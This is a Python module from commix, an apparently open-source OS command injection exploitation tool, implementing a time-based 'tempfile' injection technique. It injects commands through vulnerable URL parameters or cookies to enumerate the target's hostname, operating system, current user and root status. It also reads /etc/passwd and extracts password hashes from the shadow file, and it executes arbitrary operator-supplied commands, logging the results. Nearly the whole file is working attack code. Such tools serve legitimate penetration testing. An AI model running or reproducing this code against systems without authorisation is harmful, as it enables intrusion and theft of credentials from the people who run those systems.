#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import sys
import time

from src.utils import menu
from src.utils import settings

from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_injector

"""
 The "tempfile-based" injection technique on Semiblind OS Command Injection.
 __Warning:__ This technique is still experimental, is not yet fully functional and may leads to false-positive resutls.
"""


"""
Hostname enumeration
"""
def hostname(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
  cmd = settings.HOSTNAME
  check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
  shell = output 
  if shell:
    shell = "".join(str(p) for p in output)
    sys.stdout.write(Style.BRIGHT + "\n\n  (!) The hostname is " + Style.UNDERLINE + shell + Style.RESET_ALL + ".\n\n")
    sys.stdout.flush()
    # Add infos to logs file. 
    output_file = open(filename, "a")
    output_file.write("    (!) The hostname is " + shell + ".\n")
    output_file.close()

      
"""
Retrieve system information
"""
def system_information(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):  
  cmd = settings.RECOGNISE_OS            
  check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
  target_os = output
  if target_os:
    print ""
    target_os = "".join(str(p) for p in output)
    if target_os == "Linux":
      cmd = settings.RECOGNISE_HP
      check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
      target_arch = output
      if target_arch:
        target_arch = "".join(str(p) for p in target_arch)
        sys.stdout.write(Style.BRIGHT + "\n\n  (!) The target operating system is " + Style.UNDERLINE + target_os + Style.RESET_ALL)
        sys.stdout.write(Style.BRIGHT + " and the hardware platform is " + Style.UNDERLINE + target_arch + Style.RESET_ALL + ".\n\n")
        sys.stdout.flush()
        # Add infos to logs file.   
        output_file = open(filename, "a")
        output_file.write("    (!) The target operating system is " + target_os)
        output_file.write(" and the hardware platform is " + target_arch + ".\n")
        output_file.close()
    else:
      sys.stdout.write(Style.BRIGHT + "\n  (!) The target operating system is " + Style.UNDERLINE + target_os + Style.RESET_ALL + ".\n\n")
      sys.stdout.flush()
      # Add infos to logs file.    
      output_file = open(filename, "a")
      output_file.write("    (!) The target operating system is " + target_os + ".\n")
      output_file.close()

"""
The current user enumeration
"""
def current_user(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
  cmd = settings.CURRENT_USER
  if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
    # Check if target host is vulnerable to cookie injection.
    vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie) 
    check_how_long, output  = tfb_injector.cookie_injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
  else:
    check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
  cu_account = output
  if cu_account:
    cu_account = "".join(str(p) for p in output)
    # Check if the user have super privilleges.
    if menu.options.is_root:
      cmd = settings.ISROOT
      check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
      is_root = output
      if is_root:
        sys.stdout.write(Style.BRIGHT + "\n\n  (!) The current user is " + Style.UNDERLINE + cu_account + Style.RESET_ALL)
        # Add infos to logs file.    
        output_file = open(filename, "a")
        output_file.write("    (!) The current user is " + cu_account)
        output_file.close()
        if is_root != "0":
            sys.stdout.write(Style.BRIGHT + " and it is " + Style.UNDERLINE + "not" + Style.RESET_ALL + Style.BRIGHT + " privilleged" + Style.RESET_ALL + ".\n\n")
            sys.stdout.flush()
            # Add infos to logs file.   
            output_file = open(filename, "a")
            output_file.write(" and it is not privilleged.\n")
            output_file.close()
        else:
          sys.stdout.write(Style.BRIGHT + " and it is " + Style.UNDERLINE + "" + Style.RESET_ALL + Style.BRIGHT + " privilleged" + Style.RESET_ALL + ".\n\n")
          sys.stdout.flush()
          # Add infos to logs file.   
          output_file = open(filename, "a")
          output_file.write(" and it is privilleged.\n")
          output_file.close()
    else:
      sys.stdout.write(Style.BRIGHT + "\n\n  (!) The current user is " + Style.UNDERLINE + cu_account + Style.RESET_ALL + ".\n\n")
      sys.stdout.flush()
      # Add infos to logs file.   
      output_file = open(filename, "a")
      output_file.write("    (!) The current user is " + cu_account + "\n")
      output_file.close()        

"""
System users enumeration
"""
def system_users(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename): 
  sys.stdout.write("(*) Fetching '" + settings.PASSWD_FILE + "' to enumerate users entries... ")
  sys.stdout.flush()
  cmd = settings.SYS_USERS   
  print ""                  
  check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
  sys_users = output
  if sys_users :
    sys_users = "".join(str(p) for p in sys_users)
    sys_users = sys_users.replace("(@)","\n")
    sys_users = sys_users.split( )
    if len(sys_users) != 0 :
      sys.stdout.write(Style.BRIGHT + "\n(!) Identified " + str(len(sys_users)) + " entries in '" + settings.PASSWD_FILE + "'.\n" + Style.RESET_ALL)
      sys.stdout.flush()
      # Add infos to logs file.   
      output_file = open(filename, "a")
      output_file.write("    (!) Identified " + str(len(sys_users)) + " entries in '" + settings.PASSWD_FILE + "'.\n")
      output_file.close()
      count = 0
      for line in sys_users:
        count = count + 1
        fields = line.split(":")
        # System users privileges enumeration
        if menu.options.privileges:
          if int(fields[1]) == 0:
            is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " root user "
            is_privilleged_nh = " is root user "
          elif int(fields[1]) > 0 and int(fields[1]) < 99 :
            is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " system user "
            is_privilleged_nh = " is system user "
          elif int(fields[1]) >= 99 and int(fields[1]) < 65534 :
            if int(fields[1]) == 99 or int(fields[1]) == 60001 or int(fields[1]) == 65534:
              is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " anonymous user "
              is_privilleged_nh = " is anonymous user "
            elif int(fields[1]) == 60002:
              is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " non-trusted user "
              is_privilleged_nh = " is non-trusted user "   
            else:
              is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " regular user "
              is_privilleged_nh = " is regular user "
          else :
            is_privilleged = ""
            is_privilleged_nh = ""
        else :
          is_privilleged = ""
          is_privilleged_nh = ""
        print "  ("+str(count)+") '" + Style.BRIGHT + Style.UNDERLINE + fields[0]+ Style.RESET_ALL + "'" + Style.BRIGHT + is_privilleged + Style.RESET_ALL + "(uid=" + fields[1] + ").Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'." 
        # Add infos to logs file.   
        output_file = open(filename, "a")
        output_file.write("      ("+str(count)+") '" + fields[0]+ "'" + is_privilleged_nh + "(uid=" + fields[1] + "). Home directory is in '" + fields[2] + "'.\n" )
        output_file.close()
    else:
      print Back.RED + "(x) Error: Cannot open '" + settings.PASSWD_FILE + "' to enumerate users entries." + Style.RESET_ALL + "\n"


"""
System passwords enumeration
"""
def system_passwords(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename): 
  sys.stdout.write("(*) Fetching '" + settings.SHADOW_FILE + "' to enumerate users password hashes... ")
  sys.stdout.flush()
  cmd = settings.SYS_PASSES
  print ""                    
  check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
  sys_passes = output
  if sys_passes :
    sys_passes = "".join(str(p) for p in sys_passes)
    sys_passes = sys_passes.replace("(@)","\n")
    sys_passes = sys_passes.split( )
    if len(sys_passes) != 0 :
      sys.stdout.write(Style.BRIGHT + "\n(!) Identified " + str(len(sys_passes)) + " entries in '" + settings.SHADOW_FILE + "'.\n" + Style.RESET_ALL)
      sys.stdout.flush()
      # Add infos to logs file.   
      output_file = open(filename, "a")
      output_file.write("    (!) Identified " + str(len(sys_passes)) + " entries in '" + settings.SHADOW_FILE + "'.\n" )
      output_file.close()
      count = 0
      for line in sys_passes:
        count = count + 1
        fields = line.split(":")
        if fields[1] != "*" and fields[1] != "!!" and fields[1] != "":
          print "  ("+str(count)+") " + Style.BRIGHT + fields[0]+ Style.RESET_ALL + " : " + Style.BRIGHT + fields[1]+ Style.RESET_ALL
          # Add infos to logs file.   
          output_file = open(filename, "a")
          output_file.write("      ("+str(count)+") " + fields[0] + " : " + fields[1])
          output_file.close()
  else:
    print Back.RED + "(x) Error: Cannot open '" + settings.SHADOW_FILE + "' to enumerate users password hashes." + Style.RESET_ALL + "\n"


"""
Single os-shell execution
"""
def single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):

  cmd =  menu.options.os_cmd
  check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
  return check_how_long, output


"""
Check the defined options
"""
def do_check(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
  
  if menu.options.hostname:
    if settings.ENUMERATION_DONE == False:
      print ""
    hostname(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
    settings.ENUMERATION_DONE = True
  else:
    if settings.ENUMERATION_DONE == False:
      print ""

  if menu.options.current_user:
    current_user(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
    settings.ENUMERATION_DONE = True

  if menu.options.sys_info:
    system_information(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
    settings.ENUMERATION_DONE = True

  if menu.options.users:
    system_users(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
    settings.ENUMERATION_DONE = True

  if menu.options.passwords:
    system_passwords(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
    settings.ENUMERATION_DONE = True

# eof